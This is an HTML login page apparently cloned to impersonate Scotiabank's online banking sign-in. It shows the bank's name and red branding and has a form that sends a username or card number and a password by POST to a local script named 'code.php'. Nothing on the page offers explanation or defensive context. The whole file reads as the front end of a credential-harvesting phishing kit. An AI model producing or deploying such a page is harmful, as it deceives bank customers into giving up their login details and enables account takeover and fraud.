<!doctype html>
<html>
<head>
<title>Scotia Bank Online</title>
	<meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!--bootstrap 4 link for glyphicon -->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
  <!--bootstrap 4 link for glyphicon -->
  
	
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
	
	<style>
		*
		{
			margin: 0;
			padding: 0;
		}
		#welcome
		{
			text-align: center;
			font-size: 25px;
		}
		#scotia
		{
			text-align: center;
			color: red;
			font-size: 40px;
			font-weight: bolder;
		}
		#button
		{
			height: 40px;
			width: 270px;
			border-radius: 6px;
			background-color: red;
			color: white;
			font-weight: bold;
			border-color: red;
		}
		#button:hover
		{
			background-color: #BD0E11;		
		}
	</style>
	
	
	
</head>

<body style="background-color: #EDEDED;">
	
	<div class="container" style="margin-top: 100px;">
		<div class="row">
			<div class="col-sm-4">
			
			</div>
			<div class="col-sm-4" style="border-radius: 6px; background-color: white;">
				<br>
				<p id="welcome"><strong>Welcome to</strong></p>
				<p id="scotia">Scotiabank <sub>&#174;</sub></p>
				<br><br>
				<center>
					<form action="code.php" method="post">
						<span class="glyphicon glyphicon-user"></span>&nbsp;
						<input type="text" name="t1" value="" placeholder="Username or card number" style="border-top: none; border-left: none; border-right: none; font-size: 20px;"><br><br>
						
						<span class="glyphicon glyphicon-lock"></span>&nbsp;
						<input type="password" name="t2" value="" placeholder="Password" style="border-top: none; border-left: none; border-right: none; font-size: 20px;">
						
						<br><br><br>
						&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="checkbox" id="" name="" value="">&nbsp;
  						<label for="" style="font-style: normal;"> Remember my username or card number</label><br><br><br><br>
						
						<input type="submit" name="btn" value="Sign in" id="button">
			
					</form><br><br>
					
					<p style="color: #075EA8;"><b>Need help signing in?</b></p><br>
					
				</center>
				
				
			</div>
			<div class="col-sm-4">
			
			</div>

		</div>
	
	
	</div>
	
	
	
</body>
</html>